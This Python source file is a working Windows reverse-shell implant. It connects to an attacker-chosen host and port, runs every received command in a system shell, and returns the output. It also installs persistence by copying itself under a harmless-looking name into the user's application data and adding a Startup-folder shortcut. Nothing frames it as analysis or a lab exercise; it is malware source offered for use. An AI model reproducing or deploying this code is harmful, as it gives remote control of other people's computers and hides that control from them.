#!/usr/bin/env python3

import socket
import subprocess
import sys
import os
import base64
import shutil
from pathlib import Path
from win32com.client import Dispatch

FILE_NAME = "MyApp"

LHOST = os.environ.get("LHOST") or "0.0.0.0"
LPORT = int(os.environ.get("LPORT") or "4444")

if len(sys.argv) == 4:
    LHOST = sys.argv[1]
    LPORT = int(sys.argv[2])
    FILE_NAME = sys.argv[3]



def reverse_shell(host: str, port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((host, port))

        sock.send(b"[+] Connected\n")

        while True:
            try:
                command = sock.recv(4096).decode("utf-8", errors="replace").strip()

                if not command:
                    break

                if command.lower() in ("exit", "quit"):
                    sock.send(b"[-] Closing connection\n")
                    break

                proc = subprocess.run(
                    command, shell=True, capture_output=True, timeout=30
                )

                output = proc.stdout + proc.stderr
                # Пробуємо різні кодування Windows
                for enc in ("cp866", "cp1251", "cp437", "koi8-r"):
                    try:
                        text = output.decode(enc)
                        break
                    except:
                        continue
                else:
                    text = output.decode("utf-8", errors="replace")
                sock.send(text.encode("utf-8", errors="replace"))

            except subprocess.TimeoutExpired:
                sock.send(b"[-] Command timed out\n")
            except Exception as e:
                sock.send(f"[-] Error: {str(e)}\n".encode())

    except ConnectionRefusedError:
        print(f"[-] Connection refused: {host}:{port}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    finally:
        sock.close()


# For PyInstaller
def add_to_startup():
    if not getattr(sys, "frozen", False):
        raise RuntimeError("This function must be executed from a PyInstaller executable.")

    # Directory where the application will be installed
    app_dir = Path(os.environ["LOCALAPPDATA"]) / FILE_NAME
    app_dir.mkdir(parents=True, exist_ok=True)

    current_exe = Path(sys.executable).resolve()
    target_exe = app_dir / FILE_NAME + ".exe"

    # Copy the executable to the installation directory on first launch
    if current_exe != target_exe:
        shutil.copy2(current_exe, target_exe)

        # Start the installed copy
        subprocess.Popen([str(target_exe)])

        # Exit the current process
        sys.exit()

    startup = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    shortcut_path = os.path.join(startup, FILE_NAME + ".lnk")

    # Create a startup shortcut if it doesn't already exist
    if not os.path.exists(shortcut_path):
        shell = Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = str(target_exe)
        shortcut.WorkingDirectory = str(app_dir)
        shortcut.IconLocation = str(target_exe)
        shortcut.Save()
    

def add_to_startup_native():
    startup = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    python_exe = sys.executable
    script = str(Path(__file__).resolve())

    shortcut_path = os.path.join(startup, FILE_NAME + ".lnk")

    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = python_exe
    shortcut.Arguments = f'"{script}"'
    shortcut.WorkingDirectory = str(Path(script).parent)
    shortcut.IconLocation = python_exe
    shortcut.Save()


if __name__ == "__main__":
    reverse_shell(LHOST, LPORT)
    add_to_startup_native()

    
